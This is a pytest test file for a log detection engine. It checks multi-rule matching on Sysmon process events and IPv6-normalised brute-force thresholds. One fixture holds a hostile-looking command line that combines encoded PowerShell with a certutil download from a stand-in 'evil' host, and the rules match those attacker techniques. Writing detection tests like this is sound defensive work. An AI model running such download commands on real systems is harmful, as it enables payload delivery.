"""
Tests for multi-rule matching (check_event_all) and IPv6-aware per-source
threshold grouping in the detection engine.
"""

import sys
from datetime import datetime, timedelta
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from modules.detection_engine import DetectionEngine

ENCODED_RULE = """
id: "encoded_ps"
name: "Encoded PowerShell"
severity: "high"
mitre:
  - "T1059.001"
  - "T1027"
conditions:
  event_id: "1"
  provider: "Sysmon"
  command_line_regex: "-EncodedCommand"
"""

CERTUTIL_RULE = """
id: "certutil_download"
name: "Certutil Download"
severity: "medium"
mitre:
  - "T1105"
conditions:
  event_id: "1"
  provider: "Sysmon"
  command_line_regex: "certutil"
"""

BRUTE_FORCE_V6_RULE = """
id: "brute_force_v6"
name: "Brute Force (per source)"
severity: "high"
mitre:
  - "T1110"
conditions:
  event_id: "4625"
  threshold: 5
  time_window: 300
  group_by: "source_ip"
"""


@pytest.fixture
def multi_rule_engine(tmp_path):
    (tmp_path / "encoded.yaml").write_text(ENCODED_RULE, encoding="utf-8")
    (tmp_path / "certutil.yaml").write_text(CERTUTIL_RULE, encoding="utf-8")
    return DetectionEngine(rules_dir=str(tmp_path))


@pytest.fixture
def brute_engine(tmp_path):
    (tmp_path / "brute.yaml").write_text(BRUTE_FORCE_V6_RULE, encoding="utf-8")
    return DetectionEngine(rules_dir=str(tmp_path))


class TestCheckEventAll:
    SYSMON_DATA = {
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell -EncodedCommand certutil -urlcache http://evil/x",
        "User": "victim",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
    }

    def test_event_matching_two_rules_returns_both(self, multi_rule_engine):
        results = multi_rule_engine.check_event_all("1", datetime.now(), "process created", "Sysmon", self.SYSMON_DATA)
        assert {r["rule_id"] for r in results} == {"encoded_ps", "certutil_download"}

    def test_results_sorted_most_severe_first(self, multi_rule_engine):
        results = multi_rule_engine.check_event_all("1", datetime.now(), "process created", "Sysmon", self.SYSMON_DATA)
        assert results[0]["rule_id"] == "encoded_ps"  # high before medium
        assert results[0]["risk_level"] == "High"

    def test_all_mitre_techniques_preserved(self, multi_rule_engine):
        results = multi_rule_engine.check_event_all("1", datetime.now(), "process created", "Sysmon", self.SYSMON_DATA)
        techniques = [t for r in results for t in r["mitre_techniques"]]
        assert {"T1059.001", "T1027", "T1105"}.issubset(set(techniques))

    def test_check_event_returns_most_severe_single_match(self, multi_rule_engine):
        result = multi_rule_engine.check_event("1", datetime.now(), "process created", "Sysmon", self.SYSMON_DATA)
        assert result is not None
        assert result["rule_id"] == "encoded_ps"

    def test_no_match_returns_empty_list(self, multi_rule_engine):
        sysmon = dict(self.SYSMON_DATA, CommandLine="notepad.exe readme.txt")
        assert multi_rule_engine.check_event_all("1", datetime.now(), "x", "Sysmon", sysmon) == []


class TestIPv6PerSourceGrouping:
    @staticmethod
    def _failed_logon(ip: str) -> str:
        return f"An account failed to log on.\n\tSource Network Address:\t{ip}\n"

    def test_five_failures_from_same_ipv6_trigger(self, brute_engine):
        now = datetime.now()
        result = None
        for i in range(5):
            result = brute_engine.check_event("4625", now + timedelta(seconds=i), self._failed_logon("2001:db8::7"))
        assert result is not None
        assert result["rule_id"] == "brute_force_v6"

    def test_failures_from_five_different_ipv6_do_not_trigger(self, brute_engine):
        now = datetime.now()
        for i in range(5):
            result = brute_engine.check_event(
                "4625", now + timedelta(seconds=i), self._failed_logon(f"2001:db8::{i + 1}")
            )
            assert result is None

    def test_ipv6_spellings_share_one_counter(self, brute_engine):
        # The same source written five different ways is still one attacker
        spellings = [
            "2001:db8::7",
            "2001:0db8::7",
            "2001:DB8::7",
            "2001:db8:0:0:0:0:0:7",
            "2001:0db8:0000:0000:0000:0000:0000:0007",
        ]
        now = datetime.now()
        result = None
        for i, ip in enumerate(spellings):
            result = brute_engine.check_event("4625", now + timedelta(seconds=i), self._failed_logon(ip))
        assert result is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
